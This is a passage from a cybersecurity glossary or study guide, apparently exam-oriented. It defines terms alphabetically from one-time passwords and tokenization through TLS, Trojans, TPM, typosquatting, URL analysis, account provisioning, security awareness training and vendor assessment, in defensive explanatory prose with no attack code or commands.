2. One-Time Password (OTP) - It is when a token is generated using some sort of hash function on a shared secret value plus a synchronization seed, such as a timestamp (TOTP) or HMAC (HOTP). The token can only be used once. A new token is generated for each authentication decision. This approach still uses a key pair and hashing for security, but it does not require PKI.

3. Fast Identity Online (FIDO) Universal 2nd Factor (U2F) - It uses a public/private key pair to register each account, avoiding the need to communicate a shared secret, which is a weakness of HOTP and TOTP. The private key is locked to the U2F device and signs the token; the public key is registered with the authentication server and verifies the token. While digital certificates are not involved in authenticating users, PKI is involved when validating/confirming attestation certificates.
Tokenization - A de-identification method where a unique token is substituted for real data.

Tokenization means that all or part of the value of a database field is replaced with a randomly generated token. The token is stored with the original value on a token server or token vault, separate from the production database. An authorized query or app can retrieve the original value from the vault, if necessary, so tokenization is reversible. Tokenization is used as a substitute for encryption because, from a regulatory perspective, an encrypted field is the same value as the original data.

Tokenization is used for de-identification. De-identification obfuscates personal data from databases so that it can be shared without compromising privacy.
Top Secret Data - This is the highest level of classification for information whose unauthorized disclosure could cause exceptionally grave damage to national security. Viewing is extremely restricted and monitored.
Tracking Cookie - A cookie is a plaintext file, not malware, but if permitted by browser settings, third-party cookies can be used to record web activity, track the user's IP address, and harvest various other metadata, such as search queries and information about the browser software and configuration. Tracking cookies are created by adverts and analytics widgets embedded into many websites.
Trade Secret - Intellectual property that gives a company a competitive advantage but hasn't been registered with a copyright, trademark, or patent.
Trade Secrets - Intellectual property that gives a company a competitive advantage but hasn't been registered with a copyright, trademark, or patent.

Trade secret data refers to valuable, confidential information that gives a business a competitive advantage. Trade secrets encompass much nonpublic, proprietary information, including formulas, processes, methods, techniques, customer lists, pricing information, marketing strategies, and other business-critical data. Trade secrets have commercial value derived from their secrecy. Businesses often require employees and contractors to sign non-disclosure agreements (NDAs) to safeguard the confidentiality of trade secrets. Disclosure or unauthorized use of trade secret data is a serious legal matter. Companies can take legal action against individuals or organizations unlawfully acquiring, using, or disclosing trade secrets. Laws related to trade secrets vary across jurisdictions, but they generally aim to prevent unfair competition and provide remedies for misappropriation.
Training Topics and Techniques - It is necessary to frame security training in language that end users will respond to. Education should focus on responsibilities and threats that are relevant to users. It is necessary to educate users about new or emerging threats (such as fileless malware, phishing scams, or zero-day exploits in software), but this needs to be stated in language that users understand. Using a diversity of training techniques helps to improve engagement and retention. Training methods include facilitated workshops and events, one-on-one instruction and mentoring, plus resources such as computer-based or online training, videos, books, and blogs/newsletters.

Computer-Based Training and Gamification
Participants respond well to the competitive challenge of Capture the Flag (CTF) events. This type of gamification can be used to boost security awareness for other roles too. Computer-based training (CBT - Training and education programs delivered using computer devices and e-learning instructional models and design) allows a student to acquire skills and experience by completing various types of practical activities:

1. Simulations - Recreating system interfaces or using emulators so students can practice configuration tasks.

2. Branching scenarios - Having students choose between options to find the best choices to solve a cybersecurity incident or configuration problem.

CBT might use video game elements to improve engagement. For example, students might win badges and level-up bonuses such as skills or digitized loot to improve their in-game avatar. Simulations might be presented so that the student chooses encounters from a map and engages with a simulation environment in a first person shooter type of 3D world.

Critical Elements for Security Awareness Training

1. Policy/Handbooks - Policy and handbook training focus on familiarizing users with the organization's policies, procedures, and guidelines regarding data security, acceptable use of technology resources, data handling, and confidentiality and emphasize the importance of adhering to these policies to maintain a secure work environment.

2. Situational Awareness - Situational awareness training enhances users' ability to recognize and respond to potential security threats or suspicious activities. It emphasizes the importance of being vigilant, observing surroundings, and promptly reporting any unusual or problematic incidents that may pose a security risk.

3. Insider Threat - Insider threat training focuses on educating users about the potential risks and signs of insider threats within an organization. It helps individuals recognize and report suspicious behavior, understand the impact of insider threats on data security, and promote a culture of trust and accountability in handling sensitive information.

4. Password Management - Password management training guides users on creating strong, unique passwords; avoiding password reuse; and implementing best practices for securing and safeguarding passwords. It emphasizes the importance of regularly updating passwords and using multifactor authentication where available.

5. Removable Media and Cables - Removable media and cable training educate users on the risks associated with the unauthorized use, loss, or theft of removable media (such as USB mass storage devices) and the potential for unauthorized access or data breaches. It also guides users on the risks associated with malicious charging cables designed as an attack vector for gaining unauthorized device access.

6. Social Engineering - Social engineering training raises awareness about common social engineering tactics employed by attackers, such as phishing, pretexting, or baiting. It helps individuals recognize and avoid falling victim to these manipulative techniques, encouraging skepticism and critical thinking when interacting with unknown or suspicious requests.

7. Operational Security - Operational security training focuses on promoting good security practices in day-to-day operations. It covers physical security, workstation security, data classification, secure communications, and incident reporting to help users understand their role in preventing security incidents.

8. Hybrid/Remote Work Environments - Hybrid/remote work training addresses the unique security challenges associated with working from home or outside the traditional office environment. It covers topics such as secure remote access, secure Wi-Fi usage, protecting physical workspaces, and maintaining data security while working remotely.

Phishing Campaigns
Phishing campaigns used as employee training mechanisms involve simulated attacks to raise awareness and educate employees about the risks and consequences of falling victim to such attacks. By conducting mock phishing exercises, organizations aim to enhance threat awareness, protect sensitive information, mitigate social engineering risks, promote incident response, and strengthen security practices. Phishing attacks are prevalent and pose significant risks to many industries, making it essential for employees to know how to defend against them. Phishing is an effective attack vector due to its exploitation of human vulnerabilities, deceptive impersonation of trusted entities, psychological manipulation, broad reach, ease of use, dynamic capabilities, adaptability, and the potential for significant financial gain. These factors make phishing attacks difficult to detect, mitigate and underscore the importance of practicing vigilance and regularly training employees to recognize and respond effectively to phishing attempts.

Through training, employees become more aware of common phishing techniques and deceptive tactics used by cybercriminals. This knowledge helps them to identify and report suspicious emails or messages, reducing the likelihood of data breaches and unauthorized access to sensitive information. By training employees to recognize phishing attempts, organizations mitigate social engineering risks. Employees learn to identify messages that use common tactics such as urgent requests, spoofed identities, and enticing offers to manipulate individuals. This knowledge helps protect employees and their organization from disclosing credentials or confidential data , or installing malware. Effective training enables employees to respond appropriately to phishing attempts, such as reporting incidents to specific IT or security teams, refraining from clicking suspicious links or opening attachments, and verifying requests sent via email using alternative channels. Training employees to recognize and respond to phishing attempts strengthens an organization's cybersecurity defenses. It cultivates a culture of security awareness, empowers employees to protect sensitive information actively, and enhances the organization's resilience against evolving threats. Complemented by simulated phishing campaigns, regular training programs help build a knowledgeable and security-conscious workforce.

Anomalous Behavior
Anomalous behavior recognition (Systems that automatically detect users, hosts, and services that deviate from what is expected, or systems and training that encourage reporting of this by employees) refers to actions or patterns that deviate significantly from expectations. Examples include unusual network traffic, user account activity anomalies, insider threat actions, abnormal system events, and fraudulent transactions. Techniques such as network intrusion detection, user behavior analytics, system log analysis, and fraud detection are utilized to identify anomalous behavior. These techniques require monitoring and analyzing different data sources, comparing observed behavior against established baselines, and utilizing machine learning algorithms to detect deviations.

Recognizing Risky Behaviors
Risky behaviors are actions or practices that threaten data security, systems, or networks. These behaviors may involve unsafe online activities, such as clicking on suspicious links, visiting untrusted websites, or downloading unauthorized software. Risky behaviors can also include neglecting security measures, such as using weak passwords, sharing credentials, or ignoring software updates. Unexpected behaviors are actions that deviate from established security protocols or violate security policies. These behaviors can occur due to a lack of awareness, carelessness, or a failure to follow established procedures. Examples include unauthorized access to sensitive information, bypassing security controls, or disregarding physical security measures. Unintentional behaviors refer to actions without malicious intent but can still have detrimental consequences. These behaviors often stem from human error, lack of training, or lack of understanding of security best practices. Examples include accidental data breaches, mishandling of confidential information, or falling victim to social engineering attacks.

All three types of behaviors (risky, unexpected, and unintentional) can lead to security incidents, data breaches, or the compromise of sensitive information. Individuals must be aware of these behaviors, follow security guidelines, stay informed about emerging threats, and practice good cybersecurity hygiene. Organizations are responsible for training and educating employees about these behaviors to promote a security-conscious culture and minimize the impact of human-related vulnerabilities in the cybersecurity landscape.
Transport Layer Security - As with other early TCP/IP application protocols, HTTP communications are not secured. Secure Sockets Layer (SSL) was developed by Netscape in the 1990s to address the lack of security in HTTP. SSL proved very popular with the industry and was quickly adopted as a standard named Transport Layer Security (TLS - Security protocol that uses certificates for authentication and encryption to protect web communications and other application protocols). It is typically used with the HTTP application (referred to as HTTPS or HTTP Secure) but can also be used to secure other application protocols and as a virtual private networking (VPN) solution.

To implement TLS, a server is assigned a digital certificate signed by some trusted certificate authority (CA). The certificate proves the server's identity (assuming that the client trusts the CA) and validates the server's public/private key pair. The server uses its key pair and the TLS protocol to agree on mutually supported ciphers with the client and negotiate an encrypted communications session.

HTTPS operates over port 443 by default. HTTPS operation is indicated by using https:// for the URL and by a padlock icon shown in the browser.

It is also possible to install a certificate on the client so that the server can trust the client. This is not often used on the web but is a feature of VPNs and enterprise networks that require mutual authentication.

SSL/TLS Versions
While the acronym SSL is still used, the Transport Layer Security versions are the only ones that are safe to use. A server can provide support for legacy clients, but obviously this is less secure. For example, a TLS 1.2 server could be configured to allow clients to downgrade to TLS 1.1 or 1.0 or even SSL 3.0 if they do not support TLS 1.2.

A downgrade attack is where an on-path attack tries to force the use of a weak cipher suite and SSL/TLS version.

TLS version 1.3 was approved in 2018. One of the main features of TLS 1.3 is the removing the ability to perform downgrade attacks by preventing the use of unsecure features and algorithms from previous versions. There are also changes to the handshake protocol to reduce the number of messages and speed up connections.

Cipher Suites
A cipher suite (Lists of cryptographic algorithms that a server and client can use to negotiate a secure connection) is the algorithms supported by both the client and server to perform the different encryption and hashing operations required by the protocol. Prior to TLS 1.3, a cipher suite would be written in the following form:

ECDHE-RSA-AES128-GCM-SHA256

This means that the server can use Elliptic Curve Diffie-Hellman Ephemeral mode for session key agreement, RSA signatures, 128-bit AES-GCM (Galois Counter Mode) for symmetric bulk encryption, and 256-bit SHA for HMAC functions. Suites the server prefers are listed earlier in its supported cipher list.

TLS 1.3 uses simplified and shortened suites. A typical TLS 1.3 cipher suite appears as follows:

TLS_AES_256_GCM_SHA384

Only ephemeral key agreement is supported in 1.3 and the signature type is supplied in the certificate, so the cipher suite only lists the bulk encryption key strength and mode of operation (AES_256_GCM), plus the cryptographic hash algorithm (SHA384) used within the new hash key derivation function (HKDF). HKDF is the mechanism by which the shared secret established by D-H key agreement is used to derive symmetric session keys.
Transport Layer Security (TLS) VPN - Virtual private networking solution that uses digital certificates to identify and host and establish secure tunnels for network traffic.

A transport layer security (TLS) VPN means the client connects to the remote access server using digital certificates. The server certificate identifies the VPN gateway to the client. Optionally, the client can also be configured with its own certificate. This allows for mutual authentication, where both server and client prove their identity to one another. TLS creates an encrypted tunnel for the user to submit authentication credentials. These would normally be processed by a RADIUS server. Once the user is authenticated and the connection is fully established, the VPN gateway tunnels all communications for the local network over the secure socket.

A TLS VPN can use either TCP or UDP. UDP might be chosen for marginally superior performance, especially when tunneling latency-sensitive traffic such as voice or video. TCP might be easier to use with a default firewall policy. TLS over UDP is also referred to as Datagram TLS (DTLS).

It is important to use a secure version of TLS. The latest version at the time of writing is TLS 1.3. TLS 1.2 is also still supported. Versions earlier than this are deprecated.
Transposition Algorithm - The units in a transposition cipher stay the same in plaintext and ciphertext, but their order is changed, according to some mechanism. Consider how the ciphertext "HLOOLELWRD" has been produced:

H L O O L

E L W R D

The letters are written as columns and then the rows are concatenated to make the ciphertext.
Trend Analysis (IPS / IDS) - The process of detecting patterns within a dataset over time, and using those patterns to make predictions about future events or to better understand past events.

Trend analysis is a critical aspect of managing intrusion detection systems (IDS) and intrusion prevention systems (IPS) as it aids in understanding an environment over time, helping to identify patterns, anomalies, and potential threats. Security analysts can identify patterns and trends that indicate ongoing or growing threats by tracking events and alerts. For example, an increase in alerts related to a specific attack may suggest that a network is being targeted for attack or that a vulnerability is being actively exploited. Trending can also help in tuning IDS/IPS systems. Over time, security analysts can identify false positives or unnecessary alerts that appear frequently. These alerts can be tuned down so analysts can focus on more important alerts.

Trending data can contribute to operational security strategies by identifying common threats and frequently targeted systems. This approach highlights areas of weakness that need attention, either through changes in security policy or investment in additional security tools and training.
Trojan - A malicious software program hidden within an innocuous-seeming piece of software. Usually, the Trojan is used to try to compromise the security of the target computer. Trojan refers to malware concealed within an installer package for software that appears to be legitimate. This type of malware does not seek any type of consent for installation and is actively designed to operate secretly.
True Negative - A true negative happens when a vulnerability scanner correctly confirms the absence of a vulnerability.
True Positive - A true positive occurs when a vulnerability scanner correctly flags an existing vulnerability.
True Random Number Generator (TRNG) - A method of generating random values by sampling physical phenomena that has a high rate of entropy. Better security is obtained by true random number generator (TRNG) hardware. This uses a source of entropy, such as noise or air movement, as a nondeterministic seed for generating the key value.
Trusted Platform Module (TPM) - Specification for secure hardware-based storage of encryption keys, hashed passwords, and other user- and platform-identification information.

A Trusted Platform Module (TPM) is a cryptoprocessor implemented as a module for a discrete computer platform, such as a desktop computer, mobile device, or embedded system. TPMs are produced to different 1.2 and 2.0 version specifications. Version 2.0 is not backward compatible with version 1.2. Most vendors deprecate version 1.2.

As well as the supported version, there are three principal ways of implementing a TPM:

1. Discrete means that the TPM is implemented as a dedicated chip. This provides tamper resistance and the smallest attack surface.

2. Integrated means that the TPM is part of a chipset or CPU that performs other functions. This implementation is not tamper resistant and has a broader attack surface.

3. Firmware means the TPM is implemented in the platform's low-level operating code. This depends on the secure enclave function of the CPU or chipset to protect the cryptographic material. Examples of these include Intel's Platform Trust Technology (PTT) and AMD's fTPM. This implementation is not tamper-resistant and has the broadest attack surface (encompassing the code underpinning the CPU or chipset secure enclave functionality).

A virtual TPM can be implemented in a hypervisor to provide a service to virtual machines (VMs).
Type-safe Programming Language - A program that enforces strict type-checking during compilation and ensures variables and data are used correctly. It prevents memory-related vulnerabilities and injection attacks.

Buffer overflow attacks are mitigated on modern hardware and operating systems via address space layout randomization (ASLR) and Data Execution Prevention (DEP) controls, utilizing type-safe programming languages and incorporating secure coding practices.
Typosquatting - An attack in which an attacker registers a domain name with a common misspelling of an existing domain, so that a user who misspells a URL they enter into a browser is taken to the attacker's website. Typosquatting means that the threat actor registers a domain name very similar to a real one, such as exannple.com, hoping that users will not notice the difference and assume they are browsing a trusted site or receiving email from a known source. These are also referred to as cousin, lookalike, or doppelganger domains. Another technique is to register a hijacked subdomain using the primary domain of a trusted cloud provider, such as onmicrosoft.com. If a phishing message appears to come from example.onmicrosoft.com, many users will be inclined to trust it.
Unauthorized Hacker - A hacker operating with malicious intent.
Unified Threat Management (UTM) - All-in-one security appliances and agents that combine the functions of a firewall, malware scanner, intrusion detection, vulnerability scanner, data-loss prevention, content filtering, and so on.

Unified threat management (UTM) refers to a security product that centralizes many types of security controls—firewall, antimalware, network intrusion prevention, spam filtering, content filtering, data loss prevention, virtual private networking (VPN), cloud access gateway, and endpoint protection/malware scanning—into a single appliance. This means monitoring and management of diverse controls are consolidated into a single console. Nevertheless, UTM has some downsides. When a defense is unified under a single system, this creates the potential for a single point of failure that could affect an entire network. Distinct security systems, if they fail, might only compromise that particular avenue of attack.

Additionally, UTM systems can struggle with latency issues if subject to high levels of network activity. Also, a UTM might not perform as well as software or a device with a single dedicated security function.

To some extent, NGFW and UTM are just marketing terms. UTM is commonly deployed in small and medium-sized businesses that require a comprehensive security solution but have limited resources and IT expertise. A UTM is seen as a turnkey "do everything" solution, while a NGFW is an enterprise product with fewer features but better performance.
Uniform Resource Locator (URL) - An application-level addressing scheme for TCP/IP, allowing for human-readable resource addressing. For example: protocol://server/file, where "protocol" is the type of resource (HTTP, FTP), "server" is the name of the computer (www.microsoft.com), and "file" is the name of the resource you wish to access.
Unintentional or Inadvertent Insider Threat - A threat actor that causes a vulnerability or exposes an attack vector without malicious intent. Insider threats can also arise from unintentional sources. Unintentional or inadvertent insider threat is often caused by lack of awareness or carelessness, such as users demonstrating poor password management. Another example of unintentional insider threat is the concept of shadow IT, where users purchase or introduce computer hardware or software to the workplace without the sanction of the IT department and without going through a procurement and security analysis process. The problem of shadow IT is exacerbated by the proliferation of cloud services and mobile devices, which are easy for users to obtain. Shadow IT creates a new unmonitored attack surface for malicious adversaries to exploit.
Unintentional Threat - A threat actor that causes a vulnerability or exposes an attack vector without malicious intent.
Uninterruptible Power Supply (UPS) - A battery-powered device that supplies AC power that an electronic device can use in the event of power failure.
Unsecure Network - Configuration that exposes a large attack surface, such as through unnecessary open service ports, weak or no authentication, use of default credentials, or lack of secure communications/encryption. An unsecure network is one that lacks the attributes of confidentiality, integrity, and availability:

1. Lack of Confidentiality - threat actors are able to snoop on network traffic and recover passwords or other sensitive information. These are also described as eavesdropping attacks .

2. Lack of Integrity - threat actors are able to attach unauthorized devices. These could be used to snoop on traffic or intercept and modify it, run spoofed services and apps, or run exploit code against other network hosts. These are often described as on-path attacks .

3. Lack of Availability - threat actors are able to perform service disruption attacks. These are also described as denial of service (DoS) attacks .
Unskilled attacker - An inexperienced, unskilled attacker that typically uses tools or scripts created by others. An unskilled attacker is someone who uses hacker tools without necessarily understanding how they work or having the ability to craft new attacks. Unskilled attacks might have no specific target or any reasonable goal other than gaining attention or proving technical abilities.
Unsupported Systems / Applications - Product life cycle phase where mainstream vendor support is no longer available. Unsupported systems and applications are a particular reason that vulnerable software will be exposed as a threat vector. An unsupported system is one where its vendor no longer develops updates and patches. Unless the organization is able to patch the faulty code itself, these services and apps will be highly vulnerable to exploits. One strategy for dealing with unsupported apps that cannot be replaced is to try to isolate them from other systems. The idea is to reduce opportunities for a threat actor to access the vulnerable app and run exploit code. Using isolation as a substitute for patch management is an example of a compensating control.
URL Analysis - Session hijacking/replay, forgery, and injection attacks are difficult to identify, but the starting points for detection are likely to be URL analysis and the web server's access log.

Uniform Resource Locator Analysis
As well as pointing to the host or service location on the Internet (by domain name or IP address), a Uniform Resource Locator (URL - An application-level addressing scheme for TCP/IP, allowing for human-readable resource addressing. For example: protocol://server/file, where "protocol" is the type of resource (HTTP, FTP), "server" is the name of the computer (www.microsoft.com), and "file" is the name of the resource you wish to access) can encode some action or data to submit to the server host. This is a common vector for malicious activity.

As part of URL analysis, it is important to understand how HTTP operates. An HTTP session starts with a client (a user-agent, such as a web browser) making a request to an HTTP server. The connection establishes a TCP connection. This TCP connection can be used for multiple requests, or a client can start new TCP connections for different requests. A request typically comprises a method, a resource (such as a URL path), version number, headers, and body. The principal methods are the following:

1. GET — Retrieve a resource.

2. POST — Send data to the server for processing by the requested resource.

3. PUT — Create or replace the resource.

Data can be submitted to a server either by using a POST or PUT method and the HTTP headers and body, or by encoding the data within the URL used to access the resource. Data submitted via a URL is delimited by the ? character, which follows the resource path. Query parameters are usually formatted as one or more name=value pairs, with ampersands delimiting each pair.

The server response comprises the version number and a status code and message, plus optional headers, and message body. An HTTP response code is the header value returned by a server when a client requests a URL, such as 200 for "OK" or 404 for "Not Found."

Percent Encoding
A URL can contain only unreserved and reserved characters from the standard set. Reserved characters are used as delimiters within the URL syntax and should only be used unencoded for those purposes. The reserved characters are the following:

: / ? # [ ] @ ! $ & ' ( ) * + , ; =

There are also unsafe characters, which cannot be used in a URL. Control characters, such as null string termination, carriage return, line feed, end of file, and tab, are unsafe. Percent encoding (A mechanism for encoding characters as hexadecimal values delimited by the percent sign) allows a user-agent to submit any safe or unsafe character (or binary data) to the server within the URL. Its legitimate uses are to encode reserved characters within the URL when they are not part of the URL syntax and to submit Unicode characters. Percent encoding can be misused to obfuscate the nature of a URL (encoding unreserved characters) and submit malicious input.
User Account Deprovisioning - The process of removing an account, host, or application from the production environment. This requires revoking any privileged access that had been assigned to the object.

Deprovisioning is the process of removing the access rights and permissions allocated to an employee when they leave the company or from a contractor when a project finishes. This involves removing the account from any roles or security groups. The account might be disabled for a period and then deleted or deleted immediately.
User Account Lifecycle - The complete process of managing user accounts from creation (provisioning) through active use to removal (deprovisioning), including identity proofing, credential issuance, and access revocation.
User Account Provisioning - The process of deploying an account, host, or application to a target production environment. This involves proving the identity or integrity of the resource, and issuing it with credentials and access permissions.

Provisioning is the process of setting up a service according to a standard procedure or best practice checklist. The IT department must keep track of all assets under management, and user accounts are a type of asset. User accounts are provisioned for new employees and for temporary access, such as by consultants and contractors. Some businesses may also need to set up customer accounts.

Provisioning a user account involves the following general steps:

1. Identity Proofing - verifies that the person is who they say they are by checking official documents and records. Circumstances might also demand a background check, which verifies current and previous addresses, education, or previous employment and whether the person has a criminal record or credit issues.

2. Issuing Credentials - allows the user to select a password known only to them and/or enroll them with biometric or token-based authenticators.

3. Issuing Hardware and Software Assets - the user will need, typically a computer and/or smartphone and possibly local copies of licensed software apps. Employees need sufficient resources to do their job. If their resources are inadequate they might try to obtain hardware and software directly (shadow IT).

4. Teaching Policy Awareness - by scheduling training and providing access to learning resources so that the employee or contractor is aware of security policies and risks. They must also be aware of policies for personal use of any IT assets issued to them.

5. Creating Permissions Assignment - by identifying the work roles that the account must support and configuring the appropriate rights using a role-based, mandatory, or attribute-based access control model. If the account is granted privileged access, it should be tagged for close monitoring.
User and Role-Based Training - Another essential component of a secure system is effective user training. Untrained users represent a serious vulnerability because they are susceptible to social engineering and malware attacks and may be careless when handling sensitive or confidential data.

Appropriate security awareness training needs to be delivered to employees at all levels, including end users, technical staff, and executives. Some of the general topics that need to be covered include the following:

1. Overview of the organization's security policies and the penalties for noncompliance.

2. Incident identification and reporting procedures.

3. Site security procedures, restrictions, and advice, including safety drills, escorting guests, use of secure areas, and use of personal devices.

4. Data handling, including document confidentiality, PII, backup, encryption, and so on.

5. Password and account management plus security features of PCs and mobile devices.

6. Awareness of social engineering and malware threats, including phishing, website exploits, and spam plus alerting methods for new threats.

7. Secure use of software such as browsers and email clients plus appropriate use of Internet access, including social networking sites.

There should also be a system for identifying staff performing security-sensitive roles and grading the level of training and education required (between beginner, intermediate, and advanced, for instance). Note that in defining such training programs you need to focus on job roles, rather than job titles, as employees may perform different roles and have different security training, education, or awareness requirements in each role.

The NIST National Initiative for Cybersecurity Education framework sets out knowledge, skills, and abilities (KSAs) for different cybersecurity roles. Security awareness programs are described in SP800-50.
Vendor - Obtains products from suppliers to sell to retail businesses (B2B) or directly to customers (B2C). A vendor might add some level of customization and direct support.
Vendor Assessment Methods - Due diligence, in the context of vendor assessment and selection, refers to the comprehensive and systematic process of gathering and analyzing information about potential vendors to assess their suitability, reliability, and integrity. It involves conducting a thorough investigation and evaluation of vendors based on predetermined criteria, including financial stability, reputation, technical capabilities, security practices, regulatory compliance, and past performance.

Due diligence aims to minimize risks and support informed decisions during the vendor selection process by verifying the accuracy of vendor claims, identifying potential red flags, and ensuring alignment with the organization's needs. Through due diligence, organizations can uncover any undisclosed risks or issues, clearly understand the vendor's capabilities and limitations, and evaluate the potential impact on business operations.

1. Penetration Testing—Penetration testing evaluates vendors' security posture and identifies potential vulnerabilities in their systems, networks, and applications. By conducting penetration tests on vendor infrastructure or seeking evidence that penetration tests have been performed, organizations can gain insights into the vulnerabilities that attackers could exploit, helping them understand the potential risks associated with partnering with the vendor. Penetration testing provides a comprehensive assessment of the vendor's security resilience, allowing businesses to make informed decisions about their suitability as a vendor. Penetration tests improve the vendor assessment process by validating the effectiveness of security controls, uncovering hidden weaknesses, and assisting risk management practices.

2. Right-to-Audit Clause - A right-to-audit clause is a contractual provision that grants an organization the authority to conduct audits or assessments of vendor operational practices, information systems, and security controls. The right-to-audit clause supports vendor assessment practices by allowing organizations to validate and verify the vendor's compliance with contractual obligations, security standards, and regulatory requirements. By exercising the right to audit, organizations can gain transparency into the vendor's operations, identify gaps or deficiencies, and ensure that the vendor maintains the expected level of security and compliance at all times.

3. Evidence of Internal Audits - When performing vendor due diligence, looking for evidence that the vendor has internal audit practices is crucial. Internal audit provides an independent and objective evaluation of an organization's internal controls, risk management practices, and compliance with policies and regulations. By examining the presence and effectiveness of internal audits within a vendor's operations, businesses can gain confidence in the vendor's commitment to good governance, risk management, and compliance. Evidence of internal audit demonstrates that the vendor has established mechanisms for internal oversight, periodic assessments, and continuous improvement of their processes. It demonstrates a proactive approach to risk identification and mitigation and a commitment to secure operations.

4. Independent Assessments - Organizations often rely on independent assessments as crucial vendor selection criteria. Independent assessments involve engaging with independent experts to evaluate and verify vendor capabilities, security, and compliance practices. These assessments provide an objective and unbiased evaluation of vendor capabilities. By leveraging independent assessments, organizations can benefit from specialized knowledge and industry best practice approaches to security assessments that internal teams may not know. Leveraging independent assessments help mitigate potential biases, ensure thorough evaluations, and support informed decision-making during the vendor selection process. Additionally, periodic reassessment of existing vendors fosters continuous improvement in the vendor's security practices.

5. Supply Chain Analysis - Supply chain refers to the interconnected network of entities involved in producing, distributing, and delivering goods or services from raw material suppliers to manufacturers, distributors, retailers, and ultimately, the end customer. It is a complex ecosystem involving collaboration between numerous vendors at various stages. Vendors are essential in the supply chain as they provide goods, services, and expertise contributing to the final product or service. Vendors often include raw materials suppliers, manufacturers, logistics providers, and technology solution providers. Each vendor within the supply chain has its own set of capabilities, processes, and potential risks. Managing and assessing these vendors is crucial to ensure the smooth flow of materials, minimize disruptions, maintain quality standards, and uphold security and compliance requirements throughout the supply chain. Supply chain analysis evaluates the risks and vulnerabilities associated with the various entities (vendors) involved in a supply chain by examining the security practices, capabilities, and reliability of individual vendors within the supply chain network and how security issues with one vendor in the chain may compromise the security of the organization's environment. This information helps organizations identify weak links, vulnerabilities, and potential points of compromise within the supply chain so they can be addressed before they cause problems.

Performing vendor site visits offer firsthand observation and assessment of a vendor's physical facilities, operational processes, and overall risk management practices, allowing for a more comprehensive evaluation of potential risks and vulnerabilities.

6. Vendor Monitoring - Vendor monitoring involves continuously overseeing and evaluating vendors to ensure ongoing adherence to security standards, compliance requirements, and contractual obligations. It may include regular performance reviews, periodic assessments, and real-time monitoring of vendor activities. This proactive approach allows organizations to promptly identify and address potential risks or issues.
Vendor Diversity - Vendor diversity is essential for several reasons, offering benefits not only in terms of cybersecurity but also in business resilience, innovation, and competition:

1. Cybersecurity - Relying on a single vendor for all software and hardware solutions can create a single point of failure. The entire infrastructure may be at risk if a vulnerability is discovered in that vendor's products. Vendor diversity introduces multiple technologies, reducing the impact of a single vulnerability and making it more difficult for attackers to exploit the entire system.

2. Business Resilience - Vendor diversity mitigates the risk associated with vendor lock-in and ensures that an organization's operations are not solely reliant on one vendor's products or services. If a vendor stops doing business, goes bankrupt, or experiences a significant disruption, having alternatives helps maintain business continuity.

3. Innovation - Diverse vendors bring different perspectives, ideas, and technologies. Leveraging solutions from multiple vendors can lead to a more innovative and agile IT infrastructure, better positioning an organization to adapt to emerging trends and technologies.

4. Competition - Vendor diversity promotes healthy competition in the market, which can lead to better pricing, improved product features, and higher-quality customer support. By engaging multiple vendors, organizations can encourage continuous improvement and obtain better value for their investments.

5. Customization and Flexibility - Different vendors offer unique solutions that cater to specific needs, and having a diverse vendor ecosystem allows organizations to choose the best fit for their requirements. This flexibility can result in a more tailored and effective IT infrastructure.

6. Risk Management - Vendor diversity helps spread the risk associated with potential product or service failures, security breaches, and other issues. Organizations can better manage and mitigate risks by not trusting a single solution provider or supplier.

7. Compliance - In some industries, regulations or industry standards may require organizations to maintain vendor diversity to ensure compliance and reduce the risk of supply chain disruptions or security breaches.

Other types of controls contribute to defense in depth, such as physical security controls that block physical access to computer equipment and policies designed to define appropriate use and consequences for noncompliance.
Vendor Monitoring (Vendor Assessment Method) - Vendor monitoring involves continuously overseeing and evaluating vendors to ensure ongoing adherence to security standards, compliance requirements, and contractual obligations. It may include regular performance reviews, periodic assessments, and real-time monitoring of vendor activities. This proactive approach allows organizations to promptly identify and address potential risks or issues.
Vendor Selection - Vendor selection practices must systematically evaluate and assess potential vendors to minimize risks associated with outsourcing or procurement. It typically includes several steps, such as identifying risk criteria, conducting due diligence (A legal principle that a subject has used best practice or reasonable care when setting up, configuring, and maintaining a system), and selecting vendors based on their risk profile. Risk management practices aim to identify and mitigate risks related to financial stability, operational reliability, data security, regulatory compliance, and reputation. The goal is to select vendors who align with the organization's risk tolerance and demonstrate the capability to manage risks effectively.

Third-Party Vendor Assessment
A third-party vendor refers to an external person or organization that provides goods, services, or technology solutions to another organization but operates independently. Third-party vendors play a significant role in business operations by offering specialized expertise, products, and services that support or enable the organization's own capabilities. Third-party vendors can range from technology, software, and cloud service providers to suppliers and contractors and collectively represent an organization's supply chain. Third-party vendors bring efficiency, cost-effectiveness, expertise, and innovation to organizations but also introduce potential risks as they may have access to sensitive data, infrastructure, or critical processes. Proper vendor assessment and continuous monitoring ensure third-party vendors adhere to security standards and regulatory compliance and fulfill their obligations to safeguard business operations from potential vulnerabilities and disruptions.

Vendor assessment is a critical component of Governance, Risk, and Compliance (GRC) frameworks and plays a pivotal role in maintaining the security of IT and business operations. Vendor assessment includes carefully evaluating third-party vendor capabilities, practices, and security measures before engaging in business partnerships or entrusting them with sensitive data and critical services. The significance of vendor assessment stems from the fact that organizations increasingly rely on external vendors for various aspects of their operations, such as technology solutions, cloud services, supply chain management, and outsourcing. By thoroughly assessing vendors, businesses can ensure that their partners adhere to established security standards, comply with regulatory requirements, and mitigate potential risks effectively. Engaging with vendors with weak security practices or inadequate risk management measures can introduce significant vulnerabilities.

A study by Ponemon Institute and Bomgar identified the following statistics:

1. Companies allow 89 vendors to access their networks weekly, on average.

2. 69% of organizations have experienced a data breach due to vendor security shortcomings.

3. 65% of respondents say that it's hard to manage cybersecurity risks associated with third-party vendors.

4. 64% of respondents said that their organization focuses more on cost than security when outsourcing.

Evaluating vendors is vital for businesses to adhere to regulations, as these regulations often pertain to the vendors they collaborate with. Ensuring vendors comply with applicable regulations and industry standards protects the organization from fines and other legal consequences.

Additionally, vendor assessments provide evidence of due diligence and compliance checks, which are crucial during audits and investigations. Vendor assessment also promotes transparency and accountability. Organizations gain insight into vendor security capabilities by thoroughly evaluating vendor security practices. This knowledge supports better risk assessment and vendor selection. Furthermore, vendor assessments create a framework for monitoring and reviewing vendors' performance and security practices. Continuous evaluation helps ensure that vendors maintain their commitment to security and remain aligned with the organization.

Conflict of Interest
